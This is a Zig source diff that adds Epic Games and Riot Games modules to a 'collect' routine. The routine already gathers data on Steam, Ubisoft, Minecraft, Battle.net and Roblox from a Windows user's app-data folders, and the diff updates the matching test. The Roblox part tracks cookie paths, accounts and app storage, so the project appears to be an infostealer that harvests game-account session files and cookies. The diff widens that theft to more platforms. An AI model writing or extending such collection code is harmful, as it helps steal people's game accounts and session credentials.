@@ -4,6 +4,8 @@ const uplay = @import("uplay.zig");
 const minecraft = @import("minecraft.zig");
 const battlenet = @import("battlenet.zig");
 const roblox = @import("roblox.zig");
+const epic = @import("epic.zig");
+const riot = @import("riot.zig");
 
 pub const Game = struct {
     name: []const u8,
@@ -18,6 +20,8 @@ pub const CollectResult = struct {
     minecraft_result: minecraft.GameResult,
     battlenet_result: battlenet.GameResult,
     roblox_result: roblox.GameResult,
+    epic_result: epic.EpicResult,
+    riot_result: riot.RiotResult,
 };
 
 pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8, roaming_app_data: []const u8) !CollectResult {
@@ -51,6 +55,14 @@ pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8, roaming
         .accounts = &[_]roblox.RobloxAccount{},
         .app_storage_json = null,
     };
+    const epic_result = epic.collect(allocator, local_app_data, roaming_app_data) catch epic.EpicResult{
+        .found = false,
+        .files = &[_][]const u8{},
+    };
+    const riot_result = riot.collect(allocator, local_app_data, roaming_app_data) catch riot.RiotResult{
+        .found = false,
+        .files = &[_][]const u8{},
+    };
 
     var games = std.ArrayList(Game).init(allocator);
 
@@ -79,6 +91,16 @@ pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8, roaming
         .file_count = roblox_result.accounts.len,
         .found = roblox_result.cookie_path != null,
     });
+    try games.append(Game{
+        .name = "Epic Games",
+        .file_count = epic_result.files.len,
+        .found = epic_result.found,
+    });
+    try games.append(Game{
+        .name = "Riot Games",
+        .file_count = riot_result.files.len,
+        .found = riot_result.found,
+    });
 
     return CollectResult{
         .games = try games.toOwnedSlice(),
@@ -87,6 +109,8 @@ pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8, roaming
         .minecraft_result = minecraft_result,
         .battlenet_result = battlenet_result,
         .roblox_result = roblox_result,
+        .epic_result = epic_result,
+        .riot_result = riot_result,
     };
 }
 
@@ -100,12 +124,14 @@ const testing = std.testing;
 test "collect aggregates all sub-modules" {
     const result = try collect(testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
     defer freeCollectResult(result, testing.allocator);
-    try testing.expectEqual(@as(usize, 5), result.games.len);
+    try testing.expectEqual(@as(usize, 7), result.games.len);
     try testing.expectEqualStrings("Steam", result.games[0].name);
     try testing.expectEqualStrings("Ubisoft", result.games[1].name);
     try testing.expectEqualStrings("Minecraft", result.games[2].name);
     try testing.expectEqualStrings("Battle.net", result.games[3].name);
     try testing.expectEqualStrings("Roblox", result.games[4].name);
+    try testing.expectEqualStrings("Epic Games", result.games[5].name);
+    try testing.expectEqualStrings("Riot Games", result.games[6].name);
     for (result.games) |g| {
         try testing.expect(!g.found);
         try testing.expectEqual(@as(usize, 0), g.file_count);
